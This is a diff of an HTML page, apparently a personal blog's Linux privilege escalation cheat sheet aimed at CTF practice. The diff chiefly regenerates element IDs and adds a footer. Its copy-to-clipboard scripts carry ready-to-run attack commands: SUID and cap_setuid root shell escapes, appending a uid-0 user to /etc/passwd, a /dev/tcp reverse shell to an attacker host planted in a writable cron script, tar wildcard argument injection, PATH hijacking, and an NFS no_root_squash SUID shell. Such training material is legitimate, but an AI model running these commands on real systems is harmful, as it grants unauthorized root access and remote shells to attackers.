-var copyBtnbtn_cbd484bac9d54c80a18f0b078734fa6e=document.querySelector('button[name=btn_cbd484bac9d54c80a18f0b078734fa6e]');
-copyBtnbtn_cbd484bac9d54c80a18f0b078734fa6e.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Find SUID binaries then check GTFOBins for each\nfind / -perm -4000 -type f 2>/dev/null\n\n# Common quick wins\n/usr/bin/find -exec /bin/sh -p \\; -quit\n/usr/bin/vim -c ':!/bin/sh'\n# python, perl, bash with SUID — check GTFOBins for exact payload\n`);copyBtnbtn_cbd484bac9d54c80a18f0b078734fa6e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_cbd484bac9d54c80a18f0b078734fa6e.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_98bec0c3cce7401ba70f04be30555004=document.querySelector('button[name=btn_98bec0c3cce7401ba70f04be30555004]');
+copyBtnbtn_98bec0c3cce7401ba70f04be30555004.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Find SUID binaries then check GTFOBins for each\nfind / -perm -4000 -type f 2>/dev/null\n\n# Common quick wins\n/usr/bin/find -exec /bin/sh -p \\; -quit\n/usr/bin/vim -c ':!/bin/sh'\n# python, perl, bash with SUID — check GTFOBins for exact payload\n`);copyBtnbtn_98bec0c3cce7401ba70f04be30555004.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_98bec0c3cce7401ba70f04be30555004.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1190,15 +1208,15 @@ let res = copyTextToClipboard(`# Find SUID binaries then check GTFOBins for each
 </div></div>
 </div>
 </div>
-<div id="outline-container-orge64de45" class="outline-3">
-<h3 id="orge64de45">Capabilities Abuse</h3>
-<div class="outline-text-3" id="text-orge64de45">
+<div id="outline-container-org7ed1b06" class="outline-3">
+<h3 id="org7ed1b06">Capabilities Abuse</h3>
+<div class="outline-text-3" id="text-org7ed1b06">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_142ade314b9741c394ae2337b4dad2d0>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_812b19dc4e1a4545b69fc298aaf920f1>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_142ade314b9741c394ae2337b4dad2d0=document.querySelector('button[name=btn_142ade314b9741c394ae2337b4dad2d0]');
-copyBtnbtn_142ade314b9741c394ae2337b4dad2d0.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# python3 with cap_setuid\npython3 -c \"import os; os.setuid(0); os.system('/bin/bash')\"\n\n# perl with cap_setuid\nperl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/bash\"'\n`);copyBtnbtn_142ade314b9741c394ae2337b4dad2d0.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_142ade314b9741c394ae2337b4dad2d0.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_812b19dc4e1a4545b69fc298aaf920f1=document.querySelector('button[name=btn_812b19dc4e1a4545b69fc298aaf920f1]');
+copyBtnbtn_812b19dc4e1a4545b69fc298aaf920f1.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# python3 with cap_setuid\npython3 -c \"import os; os.setuid(0); os.system('/bin/bash')\"\n\n# perl with cap_setuid\nperl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/bash\"'\n`);copyBtnbtn_812b19dc4e1a4545b69fc298aaf920f1.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_812b19dc4e1a4545b69fc298aaf920f1.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1211,15 +1229,15 @@ let res = copyTextToClipboard(`# python3 with cap_setuid\npython3 -c \"import os
 </div></div>
 </div>
 </div>
-<div id="outline-container-org6a642d4" class="outline-3">
-<h3 id="org6a642d4">Writable /etc/passwd</h3>
-<div class="outline-text-3" id="text-org6a642d4">
+<div id="outline-container-org33031d2" class="outline-3">
+<h3 id="org33031d2">Writable /etc/passwd</h3>
+<div class="outline-text-3" id="text-org33031d2">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_a590d4120e5844f089a89ef02d9cfca5>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_b6d8b28a7b644e858a5fe59a0db1d148>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_a590d4120e5844f089a89ef02d9cfca5=document.querySelector('button[name=btn_a590d4120e5844f089a89ef02d9cfca5]');
-copyBtnbtn_a590d4120e5844f089a89ef02d9cfca5.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Generate password hash\nopenssl passwd -1 -salt xyz hacked\n\n# Append new root user\necho 'hacker:$1$xyz$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd\nsu hacker\n`);copyBtnbtn_a590d4120e5844f089a89ef02d9cfca5.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_a590d4120e5844f089a89ef02d9cfca5.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_b6d8b28a7b644e858a5fe59a0db1d148=document.querySelector('button[name=btn_b6d8b28a7b644e858a5fe59a0db1d148]');
+copyBtnbtn_b6d8b28a7b644e858a5fe59a0db1d148.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Generate password hash\nopenssl passwd -1 -salt xyz hacked\n\n# Append new root user\necho 'hacker:$1$xyz$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd\nsu hacker\n`);copyBtnbtn_b6d8b28a7b644e858a5fe59a0db1d148.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_b6d8b28a7b644e858a5fe59a0db1d148.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1233,15 +1251,15 @@ su hacker
 </div></div>
 </div>
 </div>
-<div id="outline-container-org22495c3" class="outline-3">
-<h3 id="org22495c3">Cron Job Abuse</h3>
-<div class="outline-text-3" id="text-org22495c3">
+<div id="outline-container-orgdea7a00" class="outline-3">
+<h3 id="orgdea7a00">Cron Job Abuse</h3>
+<div class="outline-text-3" id="text-orgdea7a00">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_017ec8da48b74a029dbb5075f353f873>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_9b9e77aa95f14bbd9408b73545463ac3>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_017ec8da48b74a029dbb5075f353f873=document.querySelector('button[name=btn_017ec8da48b74a029dbb5075f353f873]');
-copyBtnbtn_017ec8da48b74a029dbb5075f353f873.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# If a cron script is world-writable\necho 'bash -i >& /dev/tcp/$ATTACKER/4444 0>&1' >> /path/to/cron_script.sh\n\n# If cron uses a wildcard (tar, chown, chmod)\n# Create files named to inject arguments\ntouch -- '--checkpoint=1'\ntouch -- '--checkpoint-action=exec=bash shell.sh'\n`);copyBtnbtn_017ec8da48b74a029dbb5075f353f873.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_017ec8da48b74a029dbb5075f353f873.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_9b9e77aa95f14bbd9408b73545463ac3=document.querySelector('button[name=btn_9b9e77aa95f14bbd9408b73545463ac3]');
+copyBtnbtn_9b9e77aa95f14bbd9408b73545463ac3.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# If a cron script is world-writable\necho 'bash -i >& /dev/tcp/$ATTACKER/4444 0>&1' >> /path/to/cron_script.sh\n\n# If cron uses a wildcard (tar, chown, chmod)\n# Create files named to inject arguments\ntouch -- '--checkpoint=1'\ntouch -- '--checkpoint-action=exec=bash shell.sh'\n`);copyBtnbtn_9b9e77aa95f14bbd9408b73545463ac3.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_9b9e77aa95f14bbd9408b73545463ac3.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1256,15 +1274,15 @@ touch -- <span style="color: var(--clr-string); background-color: var(--bg-strin
 </div></div>
 </div>
 </div>
-<div id="outline-container-org004accb" class="outline-3">
-<h3 id="org004accb">Path Hijacking</h3>
-<div class="outline-text-3" id="text-org004accb">
+<div id="outline-container-org5df25fd" class="outline-3">
+<h3 id="org5df25fd">Path Hijacking</h3>
+<div class="outline-text-3" id="text-org5df25fd">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_e73a4b8045404bc4b15df56649e9e099>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_075e28f7262f47628c83c199f3dba7a1>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_e73a4b8045404bc4b15df56649e9e099=document.querySelector('button[name=btn_e73a4b8045404bc4b15df56649e9e099]');
-copyBtnbtn_e73a4b8045404bc4b15df56649e9e099.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# If a SUID binary calls a command without full path\nstrings /usr/local/bin/suid_binary | grep -v '/'   # find relative calls\n\n# Create malicious binary earlier in PATH\nexport PATH=/tmp:$PATH\necho '/bin/bash -p' > /tmp/targetcommand\nchmod +x /tmp/targetcommand\n/usr/local/bin/suid_binary\n`);copyBtnbtn_e73a4b8045404bc4b15df56649e9e099.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_e73a4b8045404bc4b15df56649e9e099.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_075e28f7262f47628c83c199f3dba7a1=document.querySelector('button[name=btn_075e28f7262f47628c83c199f3dba7a1]');
+copyBtnbtn_075e28f7262f47628c83c199f3dba7a1.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# If a SUID binary calls a command without full path\nstrings /usr/local/bin/suid_binary | grep -v '/'   # find relative calls\n\n# Create malicious binary earlier in PATH\nexport PATH=/tmp:$PATH\necho '/bin/bash -p' > /tmp/targetcommand\nchmod +x /tmp/targetcommand\n/usr/local/bin/suid_binary\n`);copyBtnbtn_075e28f7262f47628c83c199f3dba7a1.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_075e28f7262f47628c83c199f3dba7a1.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1280,15 +1298,15 @@ chmod +x /tmp/targetcommand
 </div></div>
 </div>
 </div>
-<div id="outline-container-orgc223bc2" class="outline-3">
-<h3 id="orgc223bc2">Kernel Exploits</h3>
-<div class="outline-text-3" id="text-orgc223bc2">
+<div id="outline-container-org40b1dc7" class="outline-3">
+<h3 id="org40b1dc7">Kernel Exploits</h3>
+<div class="outline-text-3" id="text-org40b1dc7">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_1f839f6439f541cf824647408cdc05a3>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_25bb91eae4aa47d7820b2ec83fff0dff>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_1f839f6439f541cf824647408cdc05a3=document.querySelector('button[name=btn_1f839f6439f541cf824647408cdc05a3]');
-copyBtnbtn_1f839f6439f541cf824647408cdc05a3.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`uname -r\n# Cross-reference against exploit-db or use:\n./linux-exploit-suggester.sh\n./linux-exploit-suggester-2.pl\n\n# Common: DirtyCow (CVE-2016-5195), overlayfs (CVE-2015-1328)\n# Kernel exploits are last resort — noisy and may crash the system\n`);copyBtnbtn_1f839f6439f541cf824647408cdc05a3.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_1f839f6439f541cf824647408cdc05a3.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_25bb91eae4aa47d7820b2ec83fff0dff=document.querySelector('button[name=btn_25bb91eae4aa47d7820b2ec83fff0dff]');
+copyBtnbtn_25bb91eae4aa47d7820b2ec83fff0dff.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`uname -r\n# Cross-reference against exploit-db or use:\n./linux-exploit-suggester.sh\n./linux-exploit-suggester-2.pl\n\n# Common: DirtyCow (CVE-2016-5195), overlayfs (CVE-2015-1328)\n# Kernel exploits are last resort — noisy and may crash the system\n`);copyBtnbtn_25bb91eae4aa47d7820b2ec83fff0dff.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_25bb91eae4aa47d7820b2ec83fff0dff.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1303,15 +1321,15 @@ let res = copyTextToClipboard(`uname -r\n# Cross-reference against exploit-db or
 </div></div>
 </div>
 </div>
-<div id="outline-container-orgf4c0e15" class="outline-3">
-<h3 id="orgf4c0e15">NFS no<sub>root</sub><sub>squash</sub></h3>
-<div class="outline-text-3" id="text-orgf4c0e15">
+<div id="outline-container-org6ab624f" class="outline-3">
+<h3 id="org6ab624f">NFS no<sub>root</sub><sub>squash</sub></h3>
+<div class="outline-text-3" id="text-org6ab624f">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_64446e049e4440b0b2a2039017bb94af>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_48cf931a65334526a95046fc42bdc553>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_64446e049e4440b0b2a2039017bb94af=document.querySelector('button[name=btn_64446e049e4440b0b2a2039017bb94af]');
-copyBtnbtn_64446e049e4440b0b2a2039017bb94af.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# On attacker — mount the share\nmkdir /tmp/nfs\nmount -t nfs $TARGET:/share /tmp/nfs\n\n# Create SUID bash\ncp /bin/bash /tmp/nfs/bash\nchmod +s /tmp/nfs/bash\n\n# On target — execute\n/share/bash -p\n`);copyBtnbtn_64446e049e4440b0b2a2039017bb94af.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_64446e049e4440b0b2a2039017bb94af.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_48cf931a65334526a95046fc42bdc553=document.querySelector('button[name=btn_48cf931a65334526a95046fc42bdc553]');
+copyBtnbtn_48cf931a65334526a95046fc42bdc553.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# On attacker — mount the share\nmkdir /tmp/nfs\nmount -t nfs $TARGET:/share /tmp/nfs\n\n# Create SUID bash\ncp /bin/bash /tmp/nfs/bash\nchmod +s /tmp/nfs/bash\n\n# On target — execute\n/share/bash -p\n`);copyBtnbtn_48cf931a65334526a95046fc42bdc553.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_48cf931a65334526a95046fc42bdc553.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1330,9 +1348,9 @@ chmod +s /tmp/nfs/bash
 </div>
 </div>
 </div>
-<div id="outline-container-org24ad65f" class="outline-2">
-<h2 id="org24ad65f">4. Quick Wins to Check First</h2>
-<div class="outline-text-2" id="text-org24ad65f">
+<div id="outline-container-org6929579" class="outline-2">
+<h2 id="org6929579">4. Quick Wins to Check First</h2>
+<div class="outline-text-2" id="text-org6929579">
 <p>
 In order — these resolve the fastest in CTF contexts:
 </p>
@@ -1348,9 +1366,9 @@ In order — these resolve the fastest in CTF contexts:
 </ol>
 </div>
 </div>
-<div id="outline-container-orgb82dc67" class="outline-2">
-<h2 id="orgb82dc67">Tips</h2>
-<div class="outline-text-2" id="text-orgb82dc67">
+<div id="outline-container-orgc2aa31d" class="outline-2">
+<h2 id="orgc2aa31d">Tips</h2>
+<div class="outline-text-2" id="text-orgc2aa31d">
 <ul class="org-ul">
 <li>Run LinPEAS first but do not just follow the red findings blindly —
 read the full output before acting</li>
@@ -1367,6 +1385,20 @@ or sudo — keep it open throughout enumeration</li>
 </div>
 </div>
 <div id="postamble" class="status">
+<div id='generated-footer' class='generated'><footer>
+ <nav>
+<div class='separator'></div>
+<a class='nav-author'href='https://gregoryhugaerts.github.io' >
+gregoryhugaerts.github.io
+</a>
+<input id='nav-toggle-bot' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-bot'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+</ul>
+</nav>
+</footer>
+</div>
 <script type="text/javascript">
 <!--/*--><![CDATA[/*><!--*/
 if (!document.cookie.split('; ').find(r => r.startsWith('mode'))) {
@@ -1374,6 +1406,7 @@ document.cookie = 'mode=dark'
 }
 document.cookie = 'light=modus-operandi-tinted'
 document.cookie = 'dark=modus-vivendi-tinted'
+document.cookie = 'options=collapsing:t__src-lang:t';
 /*
 ;; nice-org-html.js
 ;;==============================================================================
